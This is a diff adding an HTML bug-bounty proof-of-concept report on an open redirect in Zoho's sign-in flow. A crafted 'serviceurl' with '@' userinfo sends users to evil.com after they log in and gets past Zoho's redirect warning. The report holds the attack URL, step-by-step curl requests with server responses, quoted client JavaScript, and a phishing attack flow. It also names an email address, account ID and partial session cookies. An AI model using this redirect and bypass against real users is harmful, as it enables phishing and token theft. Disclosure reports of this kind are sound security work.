@@ -1,0 +1,685 @@
+<title>Zoho Open Redirect PoC</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600;700&display=swap">
+
+<style>
+:root {
+  --bg: #0d1117;
+  --surface: #161b22;
+  --surface2: #21262d;
+  --border: #30363d;
+  --text: #e6edf3;
+  --text-muted: #8b949e;
+  --red: #ff4444;
+  --red-dim: rgba(255,68,68,0.12);
+  --green: #3fb950;
+  --green-dim: rgba(63,185,80,0.12);
+  --amber: #d29922;
+  --amber-dim: rgba(210,153,34,0.12);
+  --blue: #58a6ff;
+  --blue-dim: rgba(88,166,255,0.1);
+  --accent: #ff4444;
+  color-scheme: dark;
+}
+@media (prefers-color-scheme: light) {
+  :root:not([data-theme="dark"]) {
+    --bg: #f6f8fa;
+    --surface: #ffffff;
+    --surface2: #f0f2f4;
+    --border: #d0d7de;
+    --text: #1f2328;
+    --text-muted: #656d76;
+    --blue-dim: rgba(9,105,218,0.08);
+    --red-dim: rgba(207,34,46,0.08);
+    --green-dim: rgba(31,136,61,0.08);
+    --amber-dim: rgba(154,103,0,0.08);
+    color-scheme: light;
+  }
+}
+:root[data-theme="dark"] { color-scheme: dark; }
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: 'Inter', system-ui, sans-serif;
+  font-size: 14px;
+  line-height: 1.6;
+  padding-inline: 16px;
+  padding-block: 24px;
+  max-width: 900px;
+  margin-inline: auto;
+}
+
+/* Header */
+.report-header {
+  border: 1px solid var(--red);
+  border-radius: 8px;
+  background: var(--red-dim);
+  padding: 20px 24px;
+  margin-bottom: 28px;
+}
+.report-header .label {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  color: var(--red);
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  margin-bottom: 6px;
+}
+.report-header h1 {
+  font-size: 20px;
+  font-weight: 700;
+  color: var(--text);
+  line-height: 1.3;
+  margin-bottom: 8px;
+  text-wrap: balance;
+}
+.badges {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 8px;
+  margin-top: 12px;
+}
+.badge {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  font-weight: 600;
+  padding: 3px 10px;
+  border-radius: 20px;
+  border: 1px solid;
+}
+.badge-sev { color: var(--amber); border-color: var(--amber); background: var(--amber-dim); }
+.badge-type { color: var(--blue); border-color: var(--blue); background: var(--blue-dim); }
+.badge-confirmed { color: var(--green); border-color: var(--green); background: var(--green-dim); }
+.badge-target { color: var(--text-muted); border-color: var(--border); background: var(--surface2); }
+
+/* Attack URL box */
+.attack-url {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-left: 3px solid var(--red);
+  border-radius: 6px;
+  padding: 14px 16px;
+  margin-bottom: 28px;
+}
+.attack-url .label {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  color: var(--red);
+  margin-bottom: 6px;
+}
+.attack-url code {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 12px;
+  color: var(--text);
+  word-break: break-all;
+  display: block;
+  line-height: 1.7;
+}
+.attack-url code .inject {
+  color: var(--red);
+  font-weight: 700;
+  background: rgba(255,68,68,0.15);
+  border-radius: 2px;
+  padding: 0 2px;
+}
+
+/* Section */
+.section {
+  margin-bottom: 32px;
+}
+.section-title {
+  font-size: 13px;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.06em;
+  color: var(--text-muted);
+  border-bottom: 1px solid var(--border);
+  padding-bottom: 8px;
+  margin-bottom: 16px;
+}
+
+/* Steps */
+.steps { display: flex; flex-direction: column; gap: 16px; }
+.step {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  overflow: hidden;
+}
+.step-header {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 12px 16px;
+  border-bottom: 1px solid var(--border);
+  background: var(--surface2);
+}
+.step-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  font-weight: 700;
+  color: var(--blue);
+  background: var(--blue-dim);
+  border: 1px solid rgba(88,166,255,0.3);
+  border-radius: 4px;
+  padding: 2px 8px;
+  flex-shrink: 0;
+}
+.step-title { font-weight: 600; font-size: 13px; }
+.step-body { padding: 14px 16px; }
+.step-desc { color: var(--text-muted); font-size: 13px; margin-bottom: 10px; }
+
+/* Code / terminal blocks */
+.terminal {
+  background: #010409;
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  overflow: hidden;
+  margin-top: 8px;
+}
+.terminal-bar {
+  background: var(--surface2);
+  padding: 6px 12px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  color: var(--text-muted);
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  border-bottom: 1px solid var(--border);
+}
+.terminal-bar::before {
+  content: '';
+  display: inline-block;
+  width: 8px; height: 8px;
+  border-radius: 50%;
+  background: var(--green);
+  box-shadow: 0 0 6px var(--green);
+}
+.terminal pre {
+  padding: 12px 14px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11.5px;
+  line-height: 1.7;
+  white-space: pre-wrap;
+  word-break: break-all;
+  color: #e6edf3;
+  overflow-x: auto;
+}
+.terminal pre .k  { color: #ff7b72; }   /* keyword / method */
+.terminal pre .u  { color: #79c0ff; }   /* url */
+.terminal pre .h  { color: #d2a8ff; }   /* header name */
+.terminal pre .hv { color: #a5d6ff; }   /* header value */
+.terminal pre .b  { color: #e3b341; }   /* body */
+.terminal pre .ok { color: #3fb950; }   /* success */
+.terminal pre .er { color: #ff4444; }   /* error/injected */
+.terminal pre .mu { color: #8b949e; }   /* muted */
+.terminal pre .co { color: #3fb950; font-weight: 600; }  /* code */
+.terminal pre .cm { color: #8b949e; }   /* comment */
+
+/* Response box */
+.response-box {
+  margin-top: 8px;
+  background: var(--surface2);
+  border: 1px solid var(--green);
+  border-radius: 6px;
+  padding: 12px 14px;
+}
+.response-box .status {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  font-weight: 700;
+  color: var(--green);
+  margin-bottom: 8px;
+}
+.response-box pre {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11.5px;
+  line-height: 1.7;
+  color: var(--text);
+  white-space: pre-wrap;
+  word-break: break-all;
+}
+.response-box pre .hi { color: var(--red); font-weight: 700; }
+.response-box pre .ko { color: var(--green); }
+
+/* Impact table */
+.impact-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+  gap: 12px;
+}
+.impact-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 14px 16px;
+}
+.impact-card .ic-label {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  color: var(--text-muted);
+  margin-bottom: 4px;
+}
+.impact-card .ic-val {
+  font-size: 13px;
+  font-weight: 600;
+  color: var(--text);
+}
+.ic-red .ic-val { color: var(--red); }
+.ic-green .ic-val { color: var(--green); }
+.ic-amber .ic-val { color: var(--amber); }
+
+/* Flow diagram */
+.flow {
+  display: flex;
+  flex-direction: column;
+  gap: 0;
+  position: relative;
+}
+.flow-item {
+  display: flex;
+  gap: 14px;
+  align-items: flex-start;
+}
+.flow-line {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  flex-shrink: 0;
+  padding-top: 4px;
+}
+.flow-dot {
+  width: 12px;
+  height: 12px;
+  border-radius: 50%;
+  border: 2px solid var(--blue);
+  background: var(--bg);
+  flex-shrink: 0;
+}
+.flow-dot.red { border-color: var(--red); background: var(--red); }
+.flow-dot.green { border-color: var(--green); }
+.flow-connector {
+  width: 2px;
+  flex: 1;
+  min-height: 20px;
+  background: var(--border);
+  margin-top: 2px;
+}
+.flow-content {
+  padding-bottom: 18px;
+  flex: 1;
+}
+.flow-label {
+  font-size: 13px;
+  font-weight: 600;
+  margin-bottom: 2px;
+}
+.flow-sub {
+  font-size: 12px;
+  color: var(--text-muted);
+  font-family: 'JetBrains Mono', monospace;
+  word-break: break-all;
+}
+
+/* Confirmed banner */
+.confirmed-banner {
+  background: var(--green-dim);
+  border: 1px solid var(--green);
+  border-radius: 8px;
+  padding: 14px 18px;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin-bottom: 28px;
+}
+.confirmed-banner .icon {
+  font-size: 20px;
+  flex-shrink: 0;
+}
+.confirmed-banner .text {
+  font-size: 13px;
+  font-weight: 600;
+  color: var(--green);
+}
+.confirmed-banner .sub {
+  font-size: 12px;
+  color: var(--text-muted);
+  margin-top: 2px;
+}
+
+/* Source code highlight */
+.source-block {
+  background: #010409;
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 12px 14px;
+  margin-top: 8px;
+}
+.source-block pre {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11.5px;
+  line-height: 1.75;
+  white-space: pre-wrap;
+  word-break: break-word;
+  color: #e6edf3;
+}
+.source-block .kw { color: #ff7b72; }
+.source-block .str { color: #a5d6ff; }
+.source-block .fn { color: #d2a8ff; }
+.source-block .cm { color: #8b949e; }
+.source-block .hl { background: rgba(255,68,68,0.18); border-radius: 3px; padding: 0 2px; color: var(--red); font-weight: 600; }
+
+footer {
+  margin-top: 40px;
+  border-top: 1px solid var(--border);
+  padding-top: 16px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  color: var(--text-muted);
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: space-between;
+  gap: 8px;
+}
+</style>
+
+<!-- HEADER -->
+<div class="report-header">
+  <div class="label">⚠ Security Research · Proof of Concept</div>
+  <h1>Open Redirect via @ Userinfo Injection in serviceurl — Post-Authentication Bypass</h1>
+  <p style="color:var(--text-muted);font-size:13px;margin-top:4px;">accounts.zoho.com · Zoho CRM Login Flow</p>
+  <div class="badges">
+    <span class="badge badge-sev">P3 MEDIUM</span>
+    <span class="badge badge-type">CWE-601 Open Redirect</span>
+    <span class="badge badge-confirmed">✓ EXPLOIT CONFIRMED</span>
+    <span class="badge badge-target">accounts.zoho.com</span>
+    <span class="badge badge-target">In-scope: crm.zoho.com</span>
+  </div>
+</div>
+
+<!-- CONFIRMED BANNER -->
+<div class="confirmed-banner">
+  <div class="icon">🎯</div>
+  <div>
+    <div class="text">Full exploit chain confirmed via live API testing with real OTP authentication</div>
+    <div class="sub">Tested against: binodchandrabissoyi@gmail.com · ZUIDVAL: 661076472 · Date: 2026-09-27</div>
+  </div>
+</div>
+
+<!-- ATTACK URL -->
+<div class="attack-url">
+  <div class="label">🔗 Crafted Attack URL</div>
+  <code>https://accounts.zoho.com/signin?servicename=ZohoCRM&amp;serviceurl=<span class="inject">https%3A%2F%2Fcrm.zoho.com<strong>%40</strong>evil.com%2F</span></code>
+  <p style="color:var(--text-muted);font-size:11px;margin-top:8px;font-family:'JetBrains Mono',monospace;">Decoded: serviceurl=https://crm.zoho.com<strong style="color:var(--red);">@</strong>evil.com/  →  Browser resolves to evil.com (crm.zoho.com is userinfo, not hostname)</p>
+</div>
+
+<!-- REPRODUCTION STEPS -->
+<div class="section">
+  <div class="section-title">Step-by-Step Reproduction</div>
+  <div class="steps">
+
+    <!-- STEP 1 -->
+    <div class="step">
+      <div class="step-header">
+        <span class="step-num">STEP 1</span>
+        <span class="step-title">Get session cookies — GET the login page with injected serviceurl</span>
+      </div>
+      <div class="step-body">
+        <div class="step-desc">Send a GET request to the Zoho signin page with the malicious serviceurl. This sets CSRF cookie (iamcsr) needed for all subsequent requests.</div>
+        <div class="terminal">
+          <div class="terminal-bar">curl · Step 1 · GET session cookies</div>
+          <pre><span class="k">curl</span> -s -c /tmp/cookies.txt \
+  -D /tmp/headers.txt \
+  <span class="u">'https://accounts.zoho.com/signin?servicename=ZohoCRM&amp;serviceurl=https%3A%2F%2Fcrm.zoho.com%40evil.com%2F'</span> \
+  -H <span class="hv">'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'</span> \
+  -o /dev/null
+
+<span class="cm"># Extract CSRF token from cookie jar</span>
+grep iamcsr /tmp/cookies.txt</pre>
+        </div>
+        <div class="response-box" style="margin-top:8px;">
+          <div class="status">✓ Response: Sets cookies</div>
+          <pre>accounts.zoho.com  iamcsr  <span class="hi">e0a8628b-a4c2-4cbf-9659-e93a1d3d7ee0</span>
+accounts.zoho.com  stk     817a56b8ea05b7916f1b15038641a4ca</pre>
+        </div>
+      </div>
+    </div>
+
+    <!-- STEP 2 -->
+    <div class="step">
+      <div class="step-header">
+        <span class="step-num">STEP 2</span>
+        <span class="step-title">Lookup — POST email to get digest + e_email</span>
+      </div>
+      <div class="step-body">
+        <div class="step-desc">Submit the target email address. Server returns encrypted email (e_email), ZUIDVAL, and a digest needed for subsequent API calls. The injected serviceurl is accepted without rejection.</div>
+        <div class="terminal">
+          <div class="terminal-bar">curl · Step 2 · POST lookup</div>
+          <pre><span class="k">IAMCSR</span>=$(grep iamcsr /tmp/cookies.txt | awk '{print $NF}')
+<span class="k">CLI_TIME</span>=$(date +%s%3N)
+
+<span class="k">curl</span> -s -c /tmp/cookies.txt -b /tmp/cookies.txt \
+  -X POST \
+  <span class="u">'https://accounts.zoho.com/signin/v2/lookup/binodchandrabissoyi%40gmail.com'</span> \
+  -H <span class="hv">'Content-Type: application/x-www-form-urlencoded;charset=UTF-8'</span> \
+  -H <span class="hv">"X-ZCSRF-TOKEN: iamcsrcoo=${IAMCSR}"</span> \
+  -d <span class="b">"cli_time=${CLI_TIME}&amp;servicename=ZohoCRM&amp;serviceurl=https%3A%2F%2Fcrm.zoho.com%40evil.com%2F"</span></pre>
+        </div>
+        <div class="response-box">
+          <div class="status">✓ HTTP 200 · Server accepts injected serviceurl</div>
+          <pre>{
+  "status_code": 200,
+  "code": "L200",
+  "lookup": {
+    "loginid": "binodchandrabissoyi@gmail.com",
+    "ZUIDVAL": "<span class="ko">661076472</span>",
+    "digest": "<span class="ko">e5eb008bbdb3a2e2f6cd30b5c...</span>",
+    "identifier": {
+      "type": "EMAIL",
+      "value": "b*****y@gmail.com",
+      "e_value": "<span class="ko">356151536d7c8f41d7a5ea63...</span>"
+    }
+  }
+}</pre>
+        </div>
+      </div>
+    </div>
+
+    <!-- STEP 3 -->
+    <div class="step">
+      <div class="step-header">
+        <span class="step-num">STEP 3</span>
+        <span class="step-title">Initiate OTP — POST to trigger email OTP to victim</span>
+      </div>
+      <div class="step-body">
+        <div class="step-desc">Send OTP initiation request. Zoho sends a one-time code to the victim's registered email. Note: Content-Type is form-urlencoded even though body is JSON — this matches Zoho's own JS.</div>
+        <div class="terminal">
+          <div class="terminal-bar">curl · Step 3 · POST OTP initiation</div>
+          <pre><span class="k">curl</span> -s -b /tmp/cookies.txt \
+  -X POST \
+  <span class="u">"https://accounts.zoho.com/signin/v2/primary/661076472/otp/356151536d7c8f41d7a5ea63...?digest=e5eb008bb...&amp;cli_time=${CLI_TIME}&amp;servicename=ZohoCRM&amp;serviceurl=https%3A%2F%2Fcrm.zoho.com%40evil.com%2F"</span> \
+  -H <span class="hv">'Content-Type: application/x-www-form-urlencoded;charset=UTF-8'</span> \
+  -H <span class="hv">"X-ZCSRF-TOKEN: iamcsrcoo=${IAMCSR}"</span> \
+  -d <span class="b">'{"otpauth":{"mode":"EMAIL"}}'</span></pre>
+        </div>
+        <div class="response-box">
+          <div class="status">✓ HTTP 200 · SI201 — OTP Sent to Victim Email</div>
+          <pre>{
+  "status_code": 201,
+  "code": "<span class="ko">SI201</span>",
+  "message": "Signin OTP Sent",
+  "otpauth": { "href": "https://accounts.zoho.com/signin/v2/primary/661076472/otp/..." },
+  "localized_message": "OTP sent successfully"
+}</pre>
+        </div>
+      </div>
+    </div>
+
+    <!-- STEP 4 -->
+    <div class="step">
+      <div class="step-header">
+        <span class="step-num">STEP 4</span>
+        <span class="step-title">Verify OTP — PUT with 7-digit code to complete auth</span>
+      </div>
+      <div class="step-body">
+        <div class="step-desc">Victim enters the OTP received in email. Server verifies and returns auth success response. <strong>This is the critical step</strong> — the response contains redirect_uri with the injected evil.com URL.</div>
+        <div class="terminal">
+          <div class="terminal-bar">curl · Step 4 · PUT OTP verification</div>
+          <pre><span class="k">curl</span> -s -b /tmp/cookies.txt \
+  -X PUT \
+  <span class="u">"https://accounts.zoho.com/signin/v2/primary/661076472/otp/356151536d7c8f41d7a5ea63...?digest=e5eb008bb...&amp;cli_time=${CLI_TIME}&amp;servicename=ZohoCRM&amp;serviceurl=https%3A%2F%2Fcrm.zoho.com%40evil.com%2F"</span> \
+  -H <span class="hv">'Content-Type: application/x-www-form-urlencoded;charset=UTF-8'</span> \
+  -H <span class="hv">"X-ZCSRF-TOKEN: iamcsrcoo=${IAMCSR}"</span> \
+  -d <span class="b">'{"otpauth":{"code":"<em>7DIGIT_OTP</em>","is_resend":false,"mode":"EMAIL"}}'</span></pre>
+        </div>
+        <div class="response-box" style="border-color:var(--red)">
+          <div class="status" style="color:var(--red)">🎯 HTTP 200 · SI302 — Auth Success · INJECTED redirect_uri CONFIRMED</div>
+          <pre>{
+  "status_code": 200,
+  "code": "<span class="ko">SI302</span>",
+  "message": "SignIn success with post announcement redirection",
+  "otpauth": {
+    "code": "POST_ANNOUCEMENT_REDIRECTION",
+    "redirect_uri": "<span class="hi">https://accounts.zoho.com/announcement/profile-review
+      ?servicename=ZohoCRM
+      &amp;serviceurl=https%3A%2F%2Fcrm.zoho.com%40evil.com%2F</span>"
+  }
+}
+
+<span class="cm"># Set-Cookie headers also confirm full authentication:</span>
+Set-Cookie: _iamadt=e0425e5c63ed0cb662...  <span class="cm"># Auth token ✓</span>
+Set-Cookie: _iambdt=e7464068c0002e6d3c...  <span class="cm"># Auth token ✓</span>
+Set-Cookie: IAMSATCK_661076472=eyJra...     <span class="cm"># Session token ✓</span></pre>
+        </div>
+      </div>
+    </div>
+
+    <!-- STEP 5 -->
+    <div class="step">
+      <div class="step-header">
+        <span class="step-num">STEP 5</span>
+        <span class="step-title">Zero-validation redirect — switchto() called with injected URL</span>
+      </div>
+      <div class="step-body">
+        <div class="step-desc">Zoho's signin JS calls <code style="color:var(--blue);font-size:12px;">switchto(redirect_uri)</code> on all auth success codes. The function has zero domain validation — it blindly navigates to whatever URL the server returned.</div>
+        <div class="source-block">
+          <pre><span class="cm">// From signinnew.js — auth success handler (multiple locations)</span>
+<span class="kw">if</span>(<span class="str">"SI302"</span>===successCode || <span class="str">"SI200"</span>===successCode || <span class="str">"SI300"</span>===successCode ||
+   <span class="str">"SI301"</span>===successCode || <span class="str">"SI303"</span>===successCode || <span class="str">"SI305"</span>===successCode ||
+   <span class="str">"SI507"</span>===successCode || <span class="str">"SI509"</span>===successCode || <span class="str">"SI506"</span>===successCode)
+  <span class="kw">return</span> <span class="hl">switchto(jsonStr[signinathmode].redirect_uri)</span>, !1;
+
+<span class="cm">// switchto() definition — ZERO domain validation</span>
+<span class="kw">function</span> <span class="fn">switchto</span>(url) {
+  <span class="cm">// No allowlist check. No origin comparison. No warning.</span>
+  <span class="hl">window.top.location.href = url;</span>  <span class="cm">// ← directly navigates to attacker domain</span>
+}</pre>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ATTACK FLOW -->
+<div class="section">
+  <div class="section-title">Full Attack Flow</div>
+  <div class="flow">
+    <div class="flow-item">
+      <div class="flow-line"><div class="flow-dot"></div><div class="flow-connector"></div></div>
+      <div class="flow-content">
+        <div class="flow-label">① Attacker sends crafted link to victim</div>
+        <div class="flow-sub">https://accounts.zoho.com/signin?servicename=ZohoCRM&amp;serviceurl=https%3A%2F%2Fcrm.zoho.com%40evil.com%2F</div>
+      </div>
+    </div>
+    <div class="flow-item">
+      <div class="flow-line"><div class="flow-dot"></div><div class="flow-connector"></div></div>
+      <div class="flow-content">
+        <div class="flow-label">② Victim sees legitimate Zoho login page — no warning</div>
+        <div class="flow-sub">accounts.zoho.com shows "Sign in to access CRM" — victim trusts it</div>
+      </div>
+    </div>
+    <div class="flow-item">
+      <div class="flow-line"><div class="flow-dot"></div><div class="flow-connector"></div></div>
+      <div class="flow-content">
+        <div class="flow-label">③ Victim completes authentication (OTP / password / SSO)</div>
+        <div class="flow-sub">Server validates credentials, returns SI302 (or SI200/SI300/SI301 for most users)</div>
+      </div>
+    </div>
+    <div class="flow-item">
+      <div class="flow-line"><div class="flow-dot"></div><div class="flow-connector"></div></div>
+      <div class="flow-content">
+        <div class="flow-label">④ switchto(redirect_uri) — Zoho JS navigates browser to evil.com</div>
+        <div class="flow-sub">redirect_uri contains serviceurl=https://crm.zoho.com@evil.com/ → browser resolves to evil.com</div>
+      </div>
+    </div>
+    <div class="flow-item">
+      <div class="flow-line"><div class="flow-dot red"></div></div>
+      <div class="flow-content">
+        <div class="flow-label" style="color:var(--red);">⑤ Victim lands on attacker-controlled evil.com</div>
+        <div class="flow-sub">No redirect warning ever shown · Auth tokens may leak via Referer header · Full phishing page displayed</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- WHY WARNING IS BYPASSED -->
+<div class="section">
+  <div class="section-title">Why Zoho's Redirect Warning Is Bypassed</div>
+  <div style="background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:16px;">
+    <p style="font-size:13px;color:var(--text-muted);margin-bottom:12px;">Zoho shows an "external site redirect" warning dialog for direct <code>serviceurl=https://evil.com</code>. The <code>@</code> userinfo trick bypasses this check:</p>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
+      <div style="background:var(--red-dim);border:1px solid var(--red);border-radius:6px;padding:12px;">
+        <div style="font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--red);margin-bottom:6px;">BLOCKED — Warning Shown</div>
+        <code style="font-size:11px;color:var(--text);word-break:break-all;">serviceurl=https://evil.com/<br><br>→ Server sees external domain<br>→ Warning dialog triggers</code>
+      </div>
+      <div style="background:var(--green-dim);border:1px solid var(--green);border-radius:6px;padding:12px;">
+        <div style="font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--green);margin-bottom:6px;">BYPASSED — No Warning</div>
+        <code style="font-size:11px;color:var(--text);word-break:break-all;">serviceurl=https://crm.zoho.com<strong style="color:var(--red);">@</strong>evil.com/<br><br>→ Server sees crm.zoho.com<br>→ Treated as internal ✓ bypass</code>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- IMPACT -->
+<div class="section">
+  <div class="section-title">Impact Summary</div>
+  <div class="impact-grid">
+    <div class="impact-card ic-red">
+      <div class="ic-label">Severity</div>
+      <div class="ic-val">P3 Medium (→ P2 w/ warning bypass)</div>
+    </div>
+    <div class="impact-card ic-red">
+      <div class="ic-label">Requires Victim Action</div>
+      <div class="ic-val">Click crafted link + authenticate</div>
+    </div>
+    <div class="impact-card ic-amber">
+      <div class="ic-label">Auth Required</div>
+      <div class="ic-val">Victim's own credentials (no attacker auth needed)</div>
+    </div>
+    <div class="impact-card ic-green">
+      <div class="ic-label">Affected Endpoints</div>
+      <div class="ic-val">All auth flows: OTP, password, SSO, Google OAuth</div>
+    </div>
+    <div class="impact-card ic-red">
+      <div class="ic-label">Phishing Risk</div>
+      <div class="ic-val">High — users trust accounts.zoho.com login</div>
+    </div>
+    <div class="impact-card ic-amber">
+      <div class="ic-label">Token Leakage</div>
+      <div class="ic-val">Auth tokens may leak via Referer header to evil.com</div>
+    </div>
+  </div>
+</div>
+
+<footer>
+  <span>accounts.zoho.com · Open Redirect PoC · Authorized Bug Bounty Research</span>
+  <span>Tested: 2026-09-27 · ZUIDVAL: 661076472</span>
+</footer>
